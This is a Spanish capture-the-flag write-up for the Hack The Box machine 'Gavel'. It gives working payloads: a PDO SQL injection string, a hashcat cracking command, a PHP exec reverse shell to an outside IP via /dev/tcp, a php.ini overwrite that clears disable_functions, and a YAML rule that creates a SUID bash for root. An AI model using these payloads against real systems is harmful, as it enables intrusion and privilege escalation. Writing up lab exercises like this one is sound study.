**Gavel** es una máquina de dificultad media de la plataforma de **Hack The Box**. Para resolverla necesitarás explotar una inyección SQL evadiendo PDO con la que ganaras acceso a un panel de administrador. Desde ahí deberás encontrar una vulnerabilidad RCE con la que ganar acceso al sistema.
En cuanto a la escalada de privilegios, primero tendrás que pivotar a otro usuario reutilizando una contraseña y después ganar acceso **root** aprovecharte de una utilidad del sistema que ejecuta comandos  como superusuario.

# SQL Injection 
Analizando el código del repositorio encuentro un usuario en **admin.php**:

![](/assets/images/2026-02-28-htb-gavel/gavel_admin_php.png)

El archivo **inventary.php** es vulnerable  SQL injection ya que los parámetros **sort** y **user_id** están controlados directamente por el usuario mediante GET  o POST.

![](/assets/images/2026-02-28-htb-gavel/gavel_inventary_php.png)

[Este post](https://slcyber.io/research-center/a-novel-technique-for-sql-injection-in-pdos-prepared-statements/) explica detalladamente como explotar una inyección SQL con sentencias preparadas de PDO.

Finalmente utilizando este payload consigo el usuario y el hash de la contraseña del panel de administrador:

```sql
?sort=\?;--%00&user_id=x` FROM (SELECT GROUP_CONCAT(username, 0x3A, password) AS `'x` FROM users LIMIT 0,1)y;

```

# Panel Admin

Para *crackear* el hash primero identifico de que tipo es usando [hashid](https://pypi.org/project/hashID/):

Ahora que conozco el tipo de hash, busco el identificador que le corresponde en **hashcat**:

*Crackeo* el hash usando el siguiente comando:

```bash
hashcat -m 3200 hash.txt ~/Documentos/wordlists/rockyou.txt -O

```

Con estas credenciales ya tengo acceso al panel de administrador:

Según el código fuente de **bid_handler.php**, cada vez que actualizo la regla de la subasta, crea una función con  **runkit_function_add** pasándole como código la *rule* que he introducido y posteriormente la ejecuta.
Esto significa que todo código php que introduzca en *rule* será ejecutado por el sistema.

# Acceso Inicial

Actualizo la *rule* de una de las subastas al siguiente payload:

```php
exec("bash -c 'bash -i >& /dev/tcp/10.10.16.36/1234 0>&1'"); 

```

Me pongo en escucha con **netcat**:

```shell
nc -nlvp 443

```

y al hacer la puja, recibo una **reverse shell**

# Movimiento lateral

La shell que recibo pertenece al usuario **www-data**, pero al parecer la contraseña del usuario **auctioneer** en el sistema es la misma que la de el panel de administración.

# Escalada de privilegios

Durante el reconocimiento del sistema busco  archivos que contengan la cadena *gavel* en el nombre:

Encuentro una utilidad llamada **gavel-util** que pertenece al usuario **root** y al parecer gestiona las subastas:
Como ya vi anteriormente, cuando modifico la rule se crea una función con **runkit_function_add**, pero esta vez, el código de *rule* se ejecuta como superusuario.

Para subir un nuevo *item* solo hay que ejecutar el comando:

```bash
/usr/local/bin/gavel-util submit <archivo YAML>

```

Intento subir un *item* que al añadirse ejecuta **system** para crear una copia SUID de bash

```yaml
name: "Jickiamos el sistema"
description: "A flamboyant hat rumored to make dragons jealous."
image: "[https://example.com/dragon_hat.png](https://example.com/dragon_hat.png)"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "system('cp /bin/bash /tmp/hacked; chmod u+s /tmp/hacked'); return false;"


```

Pero al parecer la configuración de php no me lo permite:

Para poder ejecutar el **system**, creo otro *item* que sobrescribe el php.ini con el siguiente contenido:

```
engine=On
display_errors=On
display_startup_errors=On
log_errors=Off
error_reporting=E_ALL
open_basedir=
memory_limit=128M
max_execution_time=30
max_input_time=60
disable_functions=
scan_dir=
allow_url_fopen=On
allow_url_include=Off 

```

para ello en el campo de *rule* inserto el siguiente comando y envió el *item*.

```php
file_put_contents('/opt/gavel/.config/php/php.ini', "engine=On\ndisplay_errors=On\ndisplay_startup_errors=On\nlog_errors=Off\nerror_reporting=E_ALL\nopen_basedir=\nmemory_limit=128M\nmax_execution_time=30\nmax_input_time=60\ndisable_functions=\nscan_dir=\nallow_url_fopen=On\nallow_url_include=Off");

```

Ahora ya debería poder ejecutar **system()**, así que vuelvo a subir el mismo *item* de antes:

```yaml
name: "Jickiamos el sistema"
description: "A flamboyant hat rumored to make dragons jealous."
image: "[https://example.com/dragon_hat.png](https://example.com/dragon_hat.png)"
price: 10000
rule_msg: "Your bid must be at least 20% higher than the previous bid and sado isn't allowed to buy this item."
rule: "system('cp /bin/bash /tmp/hacked; chmod u+s /tmp/hacked'); return false;"

```

Ahora si ejecuto `/tmp/hacked -p` obtengo acceso al usuario **root**.
